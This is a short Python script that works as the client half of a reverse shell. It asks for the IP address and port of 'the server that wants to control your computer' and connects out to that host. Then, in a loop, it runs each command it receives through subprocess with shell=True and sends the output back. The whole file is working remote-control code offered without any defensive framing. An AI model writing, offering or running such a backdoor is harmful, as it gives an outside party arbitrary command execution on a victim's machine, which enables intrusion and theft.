import socket
import os
import subprocess

s = socket.socket()


host = str(input("Enter the IP address of the server that wants to control your computer: "))
port = int(input("Enter the port of the server that wants to control your computer (default input: 9999): "))

s.connect((host, port)) 
s.send(str.encode("sucsdcess"))


while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8")) 

        if len(data) > 0:
                
                
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                
          
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")

                s.send(str.encode(output_str + str(os.getcwd()) + '> '))

s.close()
